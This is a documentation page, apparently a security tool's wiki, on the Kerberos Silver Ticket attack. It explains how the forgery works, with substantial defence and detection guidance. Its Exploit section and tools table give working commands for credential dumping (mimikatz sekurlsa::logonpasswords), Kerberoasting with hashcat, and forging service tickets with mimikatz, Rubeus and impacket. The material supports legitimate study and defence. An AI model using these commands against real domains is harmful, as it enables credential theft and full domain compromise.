# Silver Ticket

Forging service tickets without contacting the domain controller.

**MITRE ATT&CK:** [T1558.002](https://attack.mitre.org/techniques/T1558/002/) Steal or Forge Kerberos Tickets: Silver Ticket

A Silver Ticket is a forged service ticket (TGS) encrypted with the target account's
secret key. Unlike a [Golden Ticket](../forgery/golden-ticket.md), which forges a TGT and then requests
service tickets through the KDC, a Silver Ticket goes directly to the
[AP Exchange](../../protocol/ap-exchange.md) - no domain controller contact required. The attacker
controls the [PAC](../../protocol/tickets.md#pac) contents and can claim any identity and group
membership for the targeted service.

---

## How It Works

During the [AP Exchange](../../protocol/ap-exchange.md), the target service decrypts the service
ticket using its own secret key, extracts the PAC, and builds a Windows access token from the
group SIDs in the PAC. The service does **not** contact a domain controller to verify the ticket
contents by default.

This creates the attack:

1. The attacker obtains the target account's secret key (NT hash or AES key)
2. The attacker constructs a service ticket from scratch:
    - Sets `cname` to the user they want to impersonate
    - Populates the PAC with arbitrary group SIDs (e.g., Domain Admins)
    - Signs the `PAC_SERVER_CHECKSUM` with the target account's key
    - Fabricates the `PAC_PRIVSVR_CHECKSUM` (KDC signature) - since the service does not
      validate it by default, any value works
3. The attacker presents the forged ticket directly to the service in an AP-REQ
4. The service decrypts the ticket, reads the PAC, and grants access based on the forged group
   memberships

```
Attacker                              Target Service
   |                                      |
   |  AP-REQ with forged service ticket   |
   |  (encrypted with service's key)      |
   |  PAC claims: Domain Admins           |
   |------------------------------------->|
   |                                      |  Decrypt ticket -- success
   |                                      |  Read PAC -- Domain Admin
   |                                      |  Build access token
   |  AP-REP (access granted)             |
   |<-------------------------------------|
```

!!! warning "No DC contact means no DC logs"
    Because the Silver Ticket is presented directly to the target service, the domain controller
    never sees the authentication. There are no Event 4769 (TGS request) logs at the DC for this
    ticket. Detection must occur at the target service host.

### PAC Signature Bypass

The PAC in a service ticket carries four signatures (see
[Ticket Structure - PAC](../../protocol/tickets.md#pac)):

| Signature | Key | Can the attacker compute it? |
|---|---|---|
| Server signature (`PAC_SERVER_CHECKSUM`) | Target account's key | Yes |
| KDC signature (`PAC_PRIVSVR_CHECKSUM`) | `krbtgt` key | No |
| Ticket signature (CVE-2020-17049) | `krbtgt` key | No |
| Extended KDC signature (CVE-2022-37967) | `krbtgt` key | No |

An attacker holding only the service key can produce a valid server signature and none of the
other three. The forged ticket is still accepted when the target service never asks a domain
controller to validate the PAC, and Windows services running as Local System, Network Service
or Local Service, or holding `SeTcbPrivilege`, do not. The service trusts the PAC contents
without contacting the KDC.

---

## Common Silver Ticket Targets

The target account's key determines which services can be accessed. The scope of a Silver Ticket
is limited to the specific service (or services) whose key was compromised.

| Target | SPN Class | What You Get |
|---|---|---|
| File shares (SMB) | `CIFS/hostname` | Read/write access to all shares on the target host |
| Remote execution (WMI) | `HOST/hostname` + `RPCSS/hostname` | Remote command execution via WMI |
| Scheduled tasks | `HOST/hostname` | Create and modify scheduled tasks |
| PowerShell Remoting | `HTTP/hostname` + `WSMAN/hostname` | WinRM / PSRemoting shell access |
| LDAP on a DC | `LDAP/dc1.corp.local` | AD queries; potentially DCSync if targeting a DC |
| SQL Server | `MSSQLSvc/hostname` or `MSSQLSvc/hostname:port` | Database access as any user |

!!! danger "Silver Ticket to a Domain Controller's LDAP service"
    If the attacker obtains a DC's computer account hash and forges a Silver Ticket for the
    `LDAP` service on that DC, they can perform DCSync - replicating all credentials from
    Active Directory. This escalates a single computer account compromise to full domain
    compromise.

---

## Defend

### Enable PAC Validation

PAC validation is the check that catches a Silver Ticket, but it cannot be switched on for the
services Silver Tickets are usually aimed at. When it runs, the server sends the PAC signatures
to a domain controller over Netlogon, the DC checks the `PAC_PRIVSVR_CHECKSUM` using the
`krbtgt` key, and a ticket with a fabricated KDC signature fails.

Windows skips that step when the service runs as Local System, Network Service, or Local
Service, or holds `SeTcbPrivilege` (see [PAC Signature Bypass](#pac-signature-bypass) above).
Microsoft's own examples of services that skip it are "SMB File Shares, or LDAP servers"
([KB5037754](https://support.microsoft.com/help/5037754)). That covers the `CIFS` and `LDAP`
rows in the target table and, in general, Windows services that run as SYSTEM.

!!! warning "`ValidateKdcPacSignature = 1` does not protect those services"
    The `ValidateKdcPacSignature` value under
    `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters` is not a Silver Ticket
    mitigation for SMB, LDAP, or any other service with TCB privilege. Per
    [Microsoft's description](https://learn.microsoft.com/en-us/archive/blogs/openspecification/understanding-microsoft-kerberos-pac-validation),
    a value of `0` stops PAC validation "on a process that runs as a service" and `1` leaves it
    "as usual"; it cannot turn validation on for a service that holds `SeTcbPrivilege`. Setting
    it to `1` on a domain controller or file server changes nothing for a forged `CIFS` or
    `LDAP` ticket.

What the setting governs is the opposite case: a process that runs as a service under an
ordinary account without TCB privilege. The same Microsoft description says "the default value
in Windows Server 2008 for this entry is 0", so PAC validation for such a service is something
an administrator turns on by setting the value to `1`, not something to assume (see
[PAC Signatures](../../protocol/tickets.md#pac-signatures)). For everything else, the defenses are the ones below: keep the service
keys from being stolen or cracked, and make a stolen key short-lived.

### Strong Passwords for User Service Accounts

The service key is most commonly obtained by [Kerberoasting](../roasting/kerberoasting.md) user service
accounts with weak passwords. Mitigate this by:

- Using **Group Managed Service Accounts (gMSA)**: automatically rotating, 240-byte
  cryptographic random passwords that cannot be Kerberoasted in practice
- Setting minimum 25-character random passwords for any user service account
- Removing SPNs from accounts that do not need them

### Credential Guard

Credential Guard is not documented as protecting the computer account's own keys. Microsoft's
list of what it protects is NTLM hashes, Kerberos TGTs, and stored domain credentials, and its
policy reference gives the default for the machine password as "only LSASS-bound and stored in
$MACHINE.ACC registry key"; isolating it is a separate setting, Machine Identity Isolation
([DeviceGuard policy](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-deviceguard)),
listed for Windows Insider Preview. Do not rely on Credential Guard to keep a host's service
key from a local administrator.

### Computer Account Password Rotation

Computer accounts change their password every 30 days by default. Verify this is not disabled:

```powershell title="Find computer accounts with stale passwords (rotation may be disabled)"
# Check for machines with password change disabled
Get-ADComputer -Filter * -Properties PasswordLastSet |
    Where-Object { $_.PasswordLastSet -lt (Get-Date).AddDays(-60) } |
    Select-Object Name, PasswordLastSet
```

---

## Detect

Silver Ticket detection is harder than Golden Ticket detection because there is no domain
controller involvement. Detection must happen at the target host.

### Missing TGS Request

In a normal Kerberos flow, a service ticket is obtained through a TGS-REQ (Event 4769 at the DC)
before being presented to the service. A Silver Ticket skips the TGS Exchange. Look for:

- **Event 4624** (successful logon, type 3 network) at the target host **without** a
  corresponding **Event 4769** at the DC for the same user and service
- This requires cross-correlating events between the target host and the DC

The documented key for that correlation is the **Logon GUID**. Microsoft describes the field in
4769 as "a GUID that can help you correlate this event (on a domain controller) with other
events (on the target computer for which the TGS was issued) that can contain the same Logon
GUID", and names 4624 as one of them. It "might not be captured", in which case it is all
zeros.

As a raw "4624 without 4769" query this matches normal activity too, for reasons that follow
from how the events are written:

- Event 4769 is logged when the ticket is **issued**, not when it is used. A client reuses a
  cached service ticket for its whole lifetime (10 hours by default), so most Kerberos logons
  have no 4769 near them in time
- The 4769 is on whichever domain controller issued the ticket. Collect from all of them
- Only Kerberos logons have a 4769 at all. Restrict the 4624 side to
  `Authentication Package` = `Kerberos`
- Event 4624 needs the Audit Logon subcategory on the target host, and 4769 needs Audit
  Kerberos Service Ticket Operations on the domain controllers

### PAC Validation Failures

Failed PAC validation generates events only where PAC validation runs, which excludes services
with TCB privilege such as SMB and LDAP (see [Defend](#enable-pac-validation)). For a service
that is validated, [KB5037754](https://support.microsoft.com/help/5037754) defines the events,
logged in the System log of the server that accepted the connection (updates of April 9, 2024
or later):

| Event | Source | Meaning |
|---|---|---|
| 22 | Security-Kerberos | The service ticket "was denied by DC" during the validation request; the event text carries the reason and error code |
| 21 | Security-Kerberos | The DC took a non-fatal action, such as filtering SIDs |
| 23 | Security-Kerberos | The validation request could not be forwarded to a domain controller |
| 5842 / 5843 | Netlogon | Netlogon hit an unexpected error, or could not forward the request (5843 is off by default) |

A forged service ticket that is handed back to a KDC, for example as evidence in S4U2Proxy,
meets the KDC's own signature checks instead. A ticket whose full PAC signature fails or is
missing is logged by the KDC as System event 43 or 44
([KB5020805](https://support.microsoft.com/help/5020805)).

### Anomalous Access Patterns

- Administrative access to a server from a user or IP that has never connected before
- Access to high-value resources (C$ share, ADMIN$ share) by unexpected accounts
- Logon events with unusual or empty domain fields

### Windows Event Correlation

| Event | Source | What to look for |
|---|---|---|
| 4624 (type 3) | Target host | Network logon from unexpected source |
| 4634 | Target host | Logoff following suspicious 4624 |
| 4769 | Domain controller | **Absence** of this event for the session in 4624 (match on Logon GUID; see the caveats under [Missing TGS Request](#missing-tgs-request)) |
| 4672 | Target host | Special privilege logon - indicates the forged PAC claimed admin rights |

---

## Exploit

### Prerequisites

1. **Target account hash** - obtained through:
    - [Kerberoasting](../roasting/kerberoasting.md) (for user-based SPNs)
    - LSASS dump on the service host (for computer accounts)
    - DCSync (any account's hash)
2. **Domain name** - e.g., `CORP.LOCAL`
3. **Domain SID** - e.g., `S-1-5-21-...`
4. **Target SPN** - e.g., `CIFS/fileserver.corp.local`
5. **Username to impersonate** - typically `administrator`

### Step-by-Step

1. **Obtain the account hash**:

    For a user service account, Kerberoast and crack the ticket:

    ```bash
    kw-roast -d CORP.LOCAL --dc-ip 192.0.2.10 -u jsmith -p '<password>' -t svc_sql
    hashcat -m 13100 hash.txt wordlist.txt
    ```

    For a computer account, dump from LSASS on the target host:

    ```
    mimikatz # sekurlsa::logonpasswords
    ```

2. **Forge the Silver Ticket**:

    ```
    mimikatz # kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /target:fileserver.corp.local /service:CIFS /rc4:<service_account_hash> /user:administrator /ptt
    ```

    Despite the command name `kerberos::golden`, the `/service` and `/target` parameters tell
    mimikatz to create a service ticket (Silver Ticket), not a TGT.

3. **Access the service**:

    ```
    dir \\fileserver.corp.local\c$
    ```

    The forged service ticket is presented directly to the CIFS service. The service decrypts it,
    reads the PAC claiming Domain Admin, and grants access.

---

## Tools

!!! info "kerbwolf does not implement Silver Ticket forging"
    Silver Ticket creation requires the target account's key and PAC manipulation. kerbwolf
    focuses on the Kerberos authentication exchanges, not ticket forging.

| Tool | Command | Notes |
|---|---|---|
| mimikatz | `kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /target:host.corp.local /service:CIFS /rc4:<hash> /user:administrator /ptt` | Forges TGS and injects into memory |
| Rubeus | `Rubeus.exe silver /rc4:<hash> /user:administrator /domain:CORP.LOCAL /sid:S-1-5-21-... /service:CIFS/host.corp.local /ptt` | Supports RC4 and AES keys |
| impacket | `ticketer.py -nthash <hash> -domain-sid S-1-5-21-... -domain CORP.LOCAL -spn CIFS/host.corp.local administrator` | Outputs ccache file |
